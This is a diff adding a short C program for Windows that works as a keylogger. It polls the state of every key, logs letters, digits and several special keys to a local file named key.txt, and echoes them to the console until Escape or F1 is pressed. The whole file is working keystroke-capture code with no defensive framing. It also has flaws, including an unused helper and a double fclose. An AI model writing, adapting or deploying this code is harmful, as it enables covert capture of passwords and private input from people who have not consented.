@@ -1,0 +1,82 @@
+/*
+Author :- Dipendra Karki */
+#define _WIN32_WINNT 0x0500
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+
+int G(int a){
+    return GetAsyncKeyState(a);
+}
+
+void main()
+{
+    HWND hwnd = GetConsoleWindow();
+
+    FILE *fp;
+    fp = fopen("key.txt", "a");
+    if (fp == NULL) {
+        puts("Sorry! Can't open file");
+        exit(1);
+    }
+
+    SHORT prevState[256] = {0}; 
+
+    while (1) {
+        Sleep(50);
+
+        for (int i = 0; i < 256; i++) {
+            SHORT keyState = GetAsyncKeyState(i);
+
+            if (keyState & 0x8000) { 
+                if (prevState[i] == 0) { 
+                    if (i >= 48 && i <= 57) {
+                        putchar('0' + (i - 48)); 
+                        fputs((char[]){'0' + (i - 48), '\0'}, fp);
+                    }
+                    else if (i >= 96 && i <= 105) {
+                        putchar('0' + (i - 96));  
+                        fputs((char[]){'0' + (i - 96), '\0'}, fp);
+                    }
+                    else if (i >= 65 && i <= 90) {
+                        putchar('a' + (i - 65));  
+                        fputs((char[]){'a' + (i - 65), '\0'}, fp);
+                    }
+                    else if (i == VK_SPACE) {
+                        putchar(' ');  
+                        fputs(" ", fp);
+                    }
+                    else if (i == VK_BACK) {
+                        puts("[BACKSPACE]"); 
+                        fputs("[BACKSPACE]", fp); 
+                    }
+                    else if (i == VK_RETURN) {
+                        puts("[ENTER]"); 
+                        fputs("[ENTER]", fp); 
+                    }
+                    else if (i == VK_SHIFT) {
+                        puts("[SHIFT]");  
+                        fputs("[SHIFT]", fp);
+                    }
+                    else if (i == VK_CAPITAL) {
+                        puts("[CAPS]");  
+                        fputs("[CAPS]", fp);
+                    }
+
+                    fflush(fp);
+
+                    prevState[i] = 1;
+                }
+            } else {
+                prevState[i] = 0; 
+            }
+        }
+
+        if (GetAsyncKeyState(VK_ESCAPE) || GetAsyncKeyState(VK_F1)) {
+            fclose(fp);
+            break;
+        }
+    }
+    fclose(fp);
+}
